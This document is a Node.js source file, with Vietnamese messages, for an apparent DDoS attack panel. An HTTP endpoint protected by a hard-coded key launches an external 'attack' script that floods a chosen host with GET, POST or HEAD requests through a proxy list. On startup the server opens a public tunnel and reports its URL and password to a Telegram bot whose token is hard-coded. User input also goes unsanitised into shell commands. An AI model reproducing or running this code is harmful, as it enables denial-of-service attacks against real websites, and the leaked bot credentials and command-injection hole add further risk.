const express = require("express");
const { exec } = require("child_process");
const axios = require("axios");

const app = express();
const port = Math.floor(Math.random() * (9999 - 999 + 1)) + 999;
const MAX_CONCURRENT_ATTACKS = 1;

let activeAttacks = 0;
let currentPID = null;
const BOT_TOKEN = "7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw";
const CHAT_ID = "7371969470";

const sendTelegramMessage = async (message) => {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await axios.post(url, { chat_id: CHAT_ID, text: message });
};

const validateInput = ({ key, host, time, method, port }) => {
  if (![key, host, time, method, port].every(Boolean)) return "THIẾU THAM SỐ";
  if (key !== "negan") return "KEY KHÔNG HỢP LỆ";
  if (time > 200) return "THỜI GIAN PHẢI < 200S";
  if (port < 1 || port > 65535) return "CỔNG KHÔNG HỢP LỆ";
  return null;
};

const executeAttack = (command) => {
  return new Promise((resolve, reject) => {
    const childProcess = exec(command, (error, stdout, stderr) => {
      if (stderr) {
        console.error(stderr);
        reject(stderr);
      } else {
        resolve(stdout);
      }
    });

    currentPID = childProcess.pid;

    childProcess.on("close", () => {
      activeAttacks--;
      console.log(`Tiến trình ${currentPID} đã kết thúc. Slot được giải phóng.`);
      currentPID = null;
    });
  });
};

const executeAllAttacks = (methods, host, time) => {
  const commands = methods.map((method) => 
    `node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`
  );
  commands.forEach(executeAttack);
};

app.get("/api/attack", (req, res) => {
  const { key, host, time, method, port, modul } = req.query;

  if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) {
    return res.status(400).json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC", statusCode: 400 });
  }

  const validationMessage = validateInput({ key, host, time, method, port });
  if (validationMessage) {
    return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });
  }

  activeAttacks++;

  if (modul === "FULL") {
    executeAllAttacks(["GET", "POST", "HEAD"], host, time);
    res.json({ status: "SUCCESS", message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI", pid: currentPID });
  } else {
    const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
    executeAttack(command);
    res.json({ status: "SUCCESS", message: "LỆNH TẤN CÔNG ĐÃ GỬI", pid: currentPID });
  }
});

app.listen(port, async () => {
  console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`);

  const subdomain = Math.random().toString(36).substring(7);
  exec(`npx localtunnel --port ${port} --subdomain ${subdomain}`, async (error, stdout, stderr) => {
    if (error || stderr) {
      console.error("LỖI LOCALTUNNEL:", error || stderr);
      return;
    }

    const localtunnelUrl = `https://${subdomain}.loca.lt`;
    const password = await axios.get("https://loca.lt/mytunnelpassword").then(res => res.data).catch(() => "Không lấy được mật khẩu");

    const message = `🔹 LocalTunnel đang chạy:\n🌐 URL: ${localtunnelUrl}\n🔑 Mật khẩu: ${password}`;
    await sendTelegramMessage(message);
  });
});
